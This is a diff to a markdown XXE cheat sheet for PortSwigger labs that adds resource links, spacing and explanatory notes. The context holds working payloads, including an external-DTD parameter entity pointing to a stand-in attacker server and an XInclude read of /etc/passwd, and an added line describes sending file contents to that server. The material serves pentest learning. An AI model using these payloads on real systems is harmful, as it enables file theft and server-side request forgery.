@@ -6,6 +6,16 @@
 
 * [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)
 
+## Resources
+
+* https://portswigger.net/web-security/xxe
+
+* https://www.youtube.com/watch?v=gjm6VHZa_8s
+
+* https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html 
+
+* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection 
+
 ## Recon
 
 ### How to find and test for XXE vulnerabilities
@@ -56,6 +66,7 @@
 
 * We may be able to see the contents of the /etc/passwd file in the response.
 
+<br>
 
 ### In-band SSRF
 
@@ -112,6 +123,7 @@
 * Check your server logs for any network traffic.
 
 
+<br>
 
 ### Blind XXE to a server you control, when regular external entities are blocked (use parameter entities):
 
@@ -151,10 +163,13 @@
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://server-you-control.com/malicious.dtd"> %xxe;]>
 ```
 
+* This will cause the application to issue a request to the attacker's server, appending the contents of the /etc/passwd file as a query parameter.
+
+<br>
 
 ### Blind XXE to exfiltrate data – external DTD via error messages
 
-* Host the following code in a .dtd file on your server, the “nonexistent” file will cause an error message, and the response’s stack trace will contain the file’s contents:
+* Host the following code in a .dtd file on your server, the “nonexistent” file will cause an error message, and the stack trace will include the contents of the /etc/passwd in the HTTP response:
 
 
 ```xml
@@ -171,12 +186,14 @@
 ```
 
 
+<br>
 
 ### Blind XXE – repurpose a local DTD
 
 * https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd
 
 
+<br>
 
 ### Hidden Attack Surface – XInclude Attacks
 
@@ -187,11 +204,13 @@
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
 
+<br>
 
 ### Hidden Attack Surface – File Upload
 
 * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-in-exotic-files
 
+<br>
 
 ### Change Content Type of Request
 
